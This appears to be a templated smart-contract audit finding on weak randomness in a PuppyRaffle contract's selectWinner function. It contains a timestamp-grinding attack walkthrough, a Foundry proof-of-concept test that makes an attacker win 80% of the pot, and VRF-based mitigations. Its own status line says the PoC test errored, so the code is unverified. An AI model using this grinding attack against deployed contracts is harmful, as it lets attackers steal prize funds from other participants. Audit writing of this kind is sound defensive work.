### Finding Severity Justification: Winner and rarity are derived from low-entropy, manipulable inputs (msg.sender, block.timestamp, block.difficulty/prevrandao). Anyone can call selectWinner, letting the caller bias outcomes by choosing the caller address (EOA/CREATE2) and timing, while validators can further manipulate timestamp/prevrandao. This can unfairly skew selection to the attacker, enabling capture of 80% of the pot. Exploitation requires conditions (caller grinding/timing or validator collusion), so impact is real but not guaranteed every round.
## Derived From Pattern/Invariant
Weak Randomness using Block Timestamp and Difficulty

## Exploit Type
Randomness

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `selectWinner` function relies on `block.timestamp`, `block.difficulty`, and `msg.sender` to generate randomness for winner selection and NFT rarity. Malicious miners can manipulate block attributes to influence the outcome. Ordinary users can use smart contracts to predict the `random` value in the same block and only participate if the outcome is favorable (or in this case, `selectWinner` is called by a user, so they can mine a transaction where they win).

## Impact
Because winner selection and rarity use keccak(msg.sender, block.timestamp, block.difficulty) (and keccak(msg.sender, block.difficulty) for rarity), the caller can bias outcomes by choosing when to call and which address to call from. Practically, an attacker can: (a) wait to call selectWinner until a block timestamp makes the modulo pick an index they control; and (b) enter multiple distinct addresses they control to increase the chance any favorable modulo maps to them. With validator influence over timestamp/prevrandao, the outcome can be forced deterministically. Over repeated rounds this enables systematic capture of the 80% prize pool and targeted rarity outcomes, undermining fairness and value of the raffle.

## Command to Run Test


## Proof of Concept
Setup: Attacker ensures they are one of the entries (or many distinct addresses they control are in players[]). After raffleDuration passes, they do not immediately call selectWinner; instead they compute, off-chain or in a helper contract, the deterministic winner index for candidate call times:
- For a fixed block.difficulty D (unknown to the attacker ahead of time, but observed on-chain per block), define f(t) = uint256(keccak256(abi.encodePacked(attacker, t, D))) % N, where N = players.length.
- The attacker scans future timestamps t >= now and waits to call until f(t) equals an index they control. Because t is unbounded and can be waited for, a favorable t will be found quickly in practice. If they control multiple indices, the condition f(t) ∈ S (their set of indices) is even easier to satisfy.
- They then submit selectWinner in that favorable block, becoming the winner and receiving 80% of the pot.
Rarity: Since rarity = keccak256(msg.sender, block.difficulty) % 100, the caller can also influence rarity by varying the caller address (CREATE2/EOAs) and, with validator cooperation (or on testnets), by manipulating difficulty/prevrandao to target specific rarity buckets.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract WeakRngTest is Test {
    PuppyRaffle private puppy;

    address private constant FEE_ADDR = address(0xFEE);
    uint256 private constant ENTRANCE = 1 ether;

    address private p1 = address(0xA1);
    address private p2 = address(0xA2);
    address private p3 = address(0xA3);
    address private attacker = address(0xA4);
    address private entryCaller = address(0xBEEF);

    function setUp() public {
        puppy = new PuppyRaffle(ENTRANCE, FEE_ADDR, 1 days);
        address[] memory participants = new address[](4);
        participants[0] = p1;
        participants[1] = p2;
        participants[2] = p3;
        participants[3] = attacker; // attacker controls this slot (index 3)

        deal(entryCaller, ENTRANCE * 4);
        vm.prank(entryCaller);
        puppy.enterRaffle{value: ENTRANCE * 4}(participants);
    }

    function test_AttackerCanGrindTimestampToWin() public {
        // Move past raffle duration so selectWinner is callable
        vm.warp(block.timestamp + puppy.raffleDuration() + 1);

        uint256 n = 4; // players.length
        uint256 targetIndex = 3; // attacker's index in players[]
        uint256 diff = block.difficulty; // held constant here (no miner collusion required for PoC)

        // Search for a timestamp where the attacker will be selected as winner
        uint256 t0 = block.timestamp;
        uint256 chosen = 0;
        bool found = false;
        for (uint256 i = 0; i < 200_000; i++) {
            uint256 t = t0 + i;
            uint256 idx = uint256(keccak256(abi.encodePacked(attacker, t, diff))) % n;
            if (idx == targetIndex) {
                chosen = t;
                found = true;
                break;
            }
        }
        assertTrue(found, "failed to find favorable timestamp");

        // Execute selectWinner exactly at the favorable timestamp as the attacker
        vm.warp(chosen);
        uint256 before = attacker.balance;
        vm.prank(attacker);
        puppy.selectWinner();

        // Assert attacker won and received 80% of pot (4 tickets * 1 ether * 80%)
        assertEq(puppy.previousWinner(), attacker, "attacker should be the winner");
        assertEq(attacker.balance, before + (ENTRANCE * 4 * 80) / 100, "incorrect prize amount");
    }
}


## Suggested Mitigation
Use a verifiable, unbiased randomness source (e.g., Chainlink VRF v2.5) for BOTH winner selection and rarity. Do not include msg.sender or other caller-controlled inputs in the randomness derivation. If VRF is not feasible, implement a commit–reveal or two-step scheme where the random seed is fixed by an unpredictable source (e.g., VRF/threshold beacon) before selection. Additionally, restrict selectWinner to a trusted automation/keeper that does not vary per call, or ignore msg.sender entirely in randomness, to remove caller grinding. Derive rarity from the same VRF output (e.g., hash(VRF_result, tokenId)) to prevent rarity manipulation.



